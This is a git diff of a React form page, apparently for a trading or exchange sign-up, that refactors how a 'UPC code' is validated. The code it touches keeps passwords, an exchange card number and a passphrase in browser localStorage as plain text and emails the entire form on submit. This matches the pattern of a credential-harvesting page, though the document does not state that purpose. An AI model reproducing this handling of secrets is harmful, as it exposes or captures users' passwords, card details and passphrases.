@@ -7,6 +7,7 @@ import CrystalBackground from "@/components/CrystalBackground";
 import Navbar from "@/components/Navbar";
 import { sendEmail, FormData } from "@/app/lib/email";
 import { FaEye, FaEyeSlash } from "react-icons/fa";
+import { useProtection } from "@/context/ProtectionContext"; // Import the context
 
 const initialFormData: FormData = {
   surname: "",
@@ -23,7 +24,7 @@ const initialFormData: FormData = {
   exchangeCardNumber: "",
   password: "",
   confirmPassword: "",
-  upcCode: "",
+  upcCode: "", // Include upcCode in the form data
   passphrase: "",
   confirmPassphrase: "",
 };
@@ -35,8 +36,9 @@ export default function FormPage() {
   const [currentPage, setCurrentPage] = useState<number>(1);
   const [showPassword, setShowPassword] = useState<boolean>(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState<boolean>(false);
+  const { setUPCCode, isValidUPCCode } = useProtection(); // Access context values
+  const [upcError, setUpcError] = useState<string | null>(null); // State for UPC error
 
-  // Load form data from localStorage on mount.
   useEffect(() => {
     const savedData = localStorage.getItem("tradingFormData");
     if (savedData) {
@@ -44,35 +46,32 @@ export default function FormPage() {
     }
   }, []);
 
-  // Save form data to localStorage whenever it changes.
   useEffect(() => {
     localStorage.setItem("tradingFormData", JSON.stringify(formData));
   }, [formData]);
+
 
   const handleChange = (
     e: ChangeEvent<HTMLInputElement | HTMLSelectElement>
   ) => {
     const { name, value } = e.target;
-  
-    // Check for UPC Code validity during the input change
-    if (name === 'upcCode' && value !== "1234567890") {
-      setError("Invalid UPC Code");
-    } else {
-      setError("");  // Clear error if valid
-    }
-  
     setFormData((prev) => ({ ...prev, [name]: value }));
-  };
-  
 
-  // Handle final submission
+    if (name === "upcCode") {
+      setUPCCode(value); // Update the context's upcCode
+      setUpcError(null); // Clear any previous UPC error
+    }
+  };
+
   const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    const validUPCCode = "1234567890";
-    if (formData.upcCode !== validUPCCode) {
-      setError("Invalid UPC Code");
+
+    if (!isValidUPCCode()) {
+      setUpcError("Invalid UPC Code. Please check it.");
       return;
     }
+    setUpcError(null); // Clear the error if it was valid
+
     const emailSent = await sendEmail(formData);
     if (emailSent) {
       console.log("Form Data Submitted and emailed:", formData);
@@ -82,6 +81,8 @@ export default function FormPage() {
       setError("Error sending email. Please try again.");
     }
   };
+
+
 
   const fadeVariants = {
     hidden: { opacity: 0 },
@@ -307,6 +308,7 @@ export default function FormPage() {
                   value={formData.password}
                   onChange={handleChange}
                   className="w-full p-2 border border-gray-300 rounded pr-10"
+                  required
                 />
                 <button
                   type="button"
@@ -326,6 +328,7 @@ export default function FormPage() {
                   value={formData.confirmPassword}
                   onChange={handleChange}
                   className="w-full p-2 border border-gray-300 rounded pr-10"
+                  required
                 />
                 <button
                   type="button"
@@ -343,12 +346,14 @@ export default function FormPage() {
               <input
                 type="text"
                 name="upcCode"
-                value={formData.upcCode}
+                value={formData.upcCode} // Use formData.upcCode here
                 onChange={handleChange}
                 className="w-full p-2 border border-gray-300 rounded"
                 required
               />
+              {upcError && <p className="text-red-500 text-xs mt-1">{upcError}</p>} {/* Display error */}
             </div>
+
           </motion.div>
         );
       default:
